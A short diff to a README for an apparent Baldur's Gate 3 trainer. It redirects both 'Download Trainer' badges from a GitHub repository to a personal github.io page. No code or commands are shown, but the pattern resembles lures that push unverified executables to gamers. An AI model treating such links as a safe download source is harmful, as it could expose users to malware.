@@ -15,7 +15,7 @@ This is a powerful **trainer** for **Baldur's Gate 3** that gives you unlimited 
 
 ## 📥 How to Download
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge&logo=github)](https://github.com/aarons7173/baldurs-gate-3-trainer-2026)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge&logo=github)](https://aarons7173.github.io)
 
 Visit this link to download the application.
 
@@ -77,7 +77,7 @@ Press the same hotkey again, or close the trainer entirely.
 
 ## 📦 Download Again
 
-[![Download Trainer](https://img.shields.io/badge/Get%20It-Here-green?style=for-the-badge&logo=github)](https://github.com/aarons7173/baldurs-gate-3-trainer-2026)
+[![Download Trainer](https://img.shields.io/badge/Get%20It-Here-green?style=for-the-badge&logo=github)](https://aarons7173.github.io)
 
 Visit this link to download the application.
 
